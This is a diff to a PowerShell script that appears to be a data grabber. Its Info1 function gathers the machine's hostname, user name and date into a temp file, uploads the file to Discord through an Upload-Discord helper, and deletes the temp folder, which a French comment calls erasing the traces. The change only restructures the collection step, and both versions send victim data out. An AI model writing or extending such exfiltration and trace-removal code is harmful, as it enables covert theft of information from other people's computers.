@@ -14,8 +14,23 @@ function Info1 {
 cd C:\
 mkdir \temp
 cd \temp
-$namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S" | Out-File -FilePath C:\Temp\nompc.txt -Encoding utf8
-Upload-Discord -file "C:\temp\nompc.txt" -text "Hostname, Username, Date :"
+# Get the date at the selected format
+$date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
+
+# Get computer name and user name
+$namepc = $env:computername
+$user = $env:UserName
+
+# Creates the file with the format i want
+$Info1content = "Nom du pc : $namepc`r`nUser : $user`r`nDate : $date"
+
+# Writes the output of $Info1content to "Info1content.txt"
+$Info1content | Out-File -FilePath "C:\Temp\Info1content.txt" -Encoding utf8
+
+#Upload to Discord via the Upload-Discord function
+Upload-Discord -file "C:\temp\Info1content.txt" -text "Hostname, Username, Date :"
+
+#Efface les traces et supprime le dossier temporaire créé
 rmdir -R \temp
 }
 
